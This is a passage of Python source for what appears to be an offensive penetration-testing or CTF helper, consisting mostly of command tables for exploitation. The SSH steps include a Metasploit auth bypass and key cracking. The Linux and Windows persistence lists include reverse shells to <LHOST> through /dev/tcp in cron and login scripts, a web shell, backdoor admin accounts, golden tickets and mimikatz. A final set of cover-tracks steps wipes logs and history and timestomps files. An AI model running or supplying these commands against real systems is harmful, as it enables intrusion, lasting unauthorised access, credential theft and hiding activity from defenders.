...
# Pure logic split into testable leaf modules (siblings on sys.path); re-exported
# here under their historical names so every call site in this file is unchanged.
import target_parse, nmap_parse, finding_extract, cve_match
parse_discovery_target = target_parse.parse_discovery_target
_MAX_RANGE_EXPAND = target_parse._MAX_RANGE_EXPAND
_host_from_elem = nmap_parse._host_from_elem
_host_ports_from_elem = nmap_parse._host_ports_from_elem
_host_detail_from_elem = nmap_parse._host_detail_from_elem
_AUTH_TITLE = finding_extract._AUTH_TITLE
_extract_finding = finding_extract._extract_finding
_ver_key = cve_match._ver_key
_ver_cmp = cve_match._ver_cmp
_cve_sort_key = cve_match._cve_sort_key
_cpe_parts = cve_match._cpe_parts
_ver_in_match = cve_match._ver_in_match
...
# parse_discovery_target + _MAX_RANGE_EXPAND → target_parse.py (re-exported below).
...
# _host_from_elem / _host_ports_from_elem / _host_detail_from_elem → nmap_parse.py (re-exported below).
...
# _AUTH_TITLE + _extract_finding → finding_extract.py (re-exported below).
...
# _ver_key / _ver_cmp / _cve_sort_key / _cpe_parts / _ver_in_match → cve_match.py (re-exported below).
...
_EXPLOIT_SERVICES = [
    # Order == exploitation priority (best CTF/OSCP foothold first). Grouped in tiers:
    # tier 1 web/shares, tier 2 no-auth RCE, tier 3 anon/enum, tier 4 data stores,
    # tier 5 SQL, tier 6 AD, tier 7 creds-required shells, tier 8 mgmt/legacy.
    # --- tier 1: top footholds (web + windows shares) ---
    ...
    # --- tier 2: unauthenticated instant RCE ---
    ...
    # --- tier 3: anonymous footholds / high-signal enumeration ---
    ("ftp",     "FTP",                {21, 990, 2121},
    ...
    # --- tier 4: data stores (often no-auth read / RCE) ---
...
_STEP_COMMANDS = {
    ...
    "ssh": {
        1: [
            ...
            "searchsploit <PRODUCT> <VERSION>",
            "msfconsole -q -x 'use auxiliary/scanner/ssh/libssh_auth_bypass; set RHOSTS <RHOST>; set RPORT <RPORT>; set SPAWN_PTY true; run; exit'   # CVE-2018-10933",
            "git clone https://github.com/epi052/cve-2018-15473 && python3 cve-2018-15473/ssh-username-enum.py --userList /usr/share/seclists/Usernames/top-usernames-shortlist.txt <RHOST>   # OpenSSH < 7.7 user enum",
        ],
        2: [
            ...
            "chmod 600 <KEYFILE> && ssh -i <KEYFILE> <USER>@<RHOST> -p <RPORT>",
            "ssh2john <KEYFILE> > key.hash && john --wordlist=/usr/share/wordlists/rockyou.txt key.hash   # crack encrypted id_rsa passphrase",
        ],
        3: [
            "ssh -L <LPORT>:<TARGET-INTERNAL>:<TPORT> <USER>@<RHOST>   # local forward to reach an internal service",
            "ssh -D 1080 <USER>@<RHOST>   # dynamic SOCKS proxy → proxychains nmap/exploits through the host",
            "ssh -R <LPORT>:127.0.0.1:<TPORT> <USER>@<RHOST>   # remote forward (expose a local service to the target)",
            "echo '<YOUR-PUBKEY>' >> ~/.ssh/authorized_keys   # persistence when you have write access",
...
# Same inline-command convention as _PRIVESC_STEPS (authorised-engagement re-entry).
_PERSIST_STEPS = {
    "linux": [
        "SSH key: mkdir -p ~/.ssh; echo '<YOUR-PUBKEY>' >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys  (repeat for /root and each user home)",
        "Cron: (crontab -l 2>/dev/null; echo '* * * * * bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"') | crontab -   (or drop a file in /etc/cron.d)",
        "systemd: write /etc/systemd/system/bd.service (ExecStart=<reverse shell>) → systemctl enable --now bd; a .timer re-fires it on a schedule",
        "Priv user: useradd -o -u 0 -g 0 -m bd && passwd bd  (uid 0)  /  echo 'bd ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/bd",
        "rc backdoor: echo 'bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\" &' >> ~/.bashrc  (or /etc/profile.d/x.sh) — fires on next login",
        "SUID backdoor: cp /bin/bash /usr/local/bin/.bd && chmod 4755 /usr/local/bin/.bd → later: /usr/local/bin/.bd -p",
        "Boot: echo 'bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\" &' >> /etc/rc.local && chmod +x /etc/rc.local",
        "PAM/SSH backdoor: patch pam_unix / add an authorized_keys forced-command; log creds via a PAM shim — high-effort, note it in the report",
        "Web shell: echo '<?php system($_GET[0]);?>' > /var/www/html/.s.php → curl 'http://<RHOST>/.s.php?0=id'",
        "Stash creds: record every hash/password/SSH key/DB cred found — the fastest and quietest re-entry path",
    ],
    "windows": [
        "Local admin: net user bd Passw0rd! /add && net localgroup Administrators bd /add   (domain: append /domain)",
        "Run key: reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v bd /t REG_SZ /d 'C:\\path\\bd.exe' /f  (HKCU for per-user; fires at logon)",
        "Task: schtasks /create /tn bd /tr 'C:\\path\\bd.exe' /sc onlogon /ru SYSTEM /f   (or /sc minute /mo 5 for a periodic callback)",
        "Service: sc create bd binPath= 'C:\\path\\bd.exe' start= auto obj= LocalSystem && sc start bd",
        "Startup folder: copy bd.exe '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'  (All-Users path fires for every login)",
        "WMI (fileless): __EventFilter + CommandLineEventConsumer bound to a trigger — survives reboot; PowerSploit Install-Persistence automates it",
        "IFEO sticky-keys: reg add 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe' /v Debugger /d 'C:\\Windows\\System32\\cmd.exe' /f → Shift x5 at lockscreen = SYSTEM cmd",
        "Enable RDP: reg add 'HKLM\\System\\CurrentControlSet\\Control\\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group='remote desktop' new enable=Yes",
        "AD domain persistence: impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain <DOMAIN> Administrator  (golden); or grant DCSync / AdminSDHolder rights",
        "Dump & reuse: mimikatz sekurlsa::logonpasswords / lsadump::sam → impacket-psexec -hashes :<NTHASH> <DOMAIN>/<USER>@<RHOST>",
    ],
}
...
_COVER_STEPS = {
    "linux": [
        "History: unset HISTFILE HISTSIZE; history -c; cat /dev/null > ~/.bash_history  (set export HISTFILE=/dev/null at session start to never write it)",
        "Logs: sed -i '/<LHOST>/d' /var/log/auth.log /var/log/syslog; echo -n > /var/log/wtmp /var/log/btmp  (utmpdump to surgically edit wtmp)",
        "Timestomp: touch -r /etc/passwd <file>  (copy a neighbour's timestamp)  /  touch -t 202401010000 <file>",
        "Wipe drops: shred -u linpeas.sh exploit.c payload*; rm -rf /tmp/.<yourdir>  (shred defeats simple undelete)",
        "Undo artifacts: crontab -r or edit /etc/cron.d; remove your authorized_keys line; userdel bd; rm /etc/sudoers.d/bd",
        "Auditing: auditctl -D (flush rules — itself noisy, note it); check ~/.bash_logout won't re-log; keep HISTFILE unset",
        "Close cleanly: exit sessions gracefully and keep a written list of every file/user/service touched for the cleanup + report",
    ],
    "windows": [
        "PS history: del (Get-PSReadlineOption).HistorySavePath  (…\\PowerShell\\PSReadline\\ConsoleHost_history.txt); Clear-History",
        "Event logs: wevtutil cl Security & wevtutil cl System & wevtutil cl Application  (a mass clear is itself logged/alerting — note it)",
        "Timestomp: (Get-Item x).LastWriteTime=(Get-Item C:\\Windows\\System32\\cmd.exe).LastWriteTime  (SetMACE.exe for $MFT-level)",
        "Wipe drops: del /f /q winPEAS.exe bd.exe; cipher /w:C:\\path  (overwrite slack space); clear %TEMP%",
        "Traces: del C:\\Windows\\Prefetch\\*.pf; del '%APPDATA%\\Microsoft\\Windows\\Recent\\*'; clear the RunMRU registry key",
        "Undo artifacts: net user bd /del; schtasks /delete /tn bd /f; sc delete bd; remove any Run/IFEO keys you added",
        "Note evasion: document any Sysmon/ETW/AV you disabled or bypassed; restore config where the engagement rules require it",
    ],
}
